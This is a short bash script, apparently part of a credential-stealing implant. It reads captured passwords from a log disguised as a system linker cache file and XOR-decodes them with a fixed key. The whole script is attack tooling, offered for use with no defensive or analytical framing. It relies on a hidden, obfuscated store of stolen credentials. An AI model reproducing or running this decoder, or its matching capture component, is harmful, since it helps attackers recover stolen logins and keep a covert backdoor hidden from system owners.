#!/bin/bash
# Decode captured credentials
LOG="${1:-/var/cache/ldconfig/aux-cache.log}"
[ ! -f "$LOG" ] && echo "no creds yet" && exit 0

KEY="ld.so.cache"
while IFS= read -r -n1 char; do
    if [ -n "$char" ]; then
        c=$(printf "%d" "'$char")
        k=$(printf "%d" "'${KEY:$((i % 11)):1}")
        printf "\\x$(printf '%02x' $((c ^ k)))"
        ((i++))
    else
        echo
        i=0
    fi
done < "$LOG"
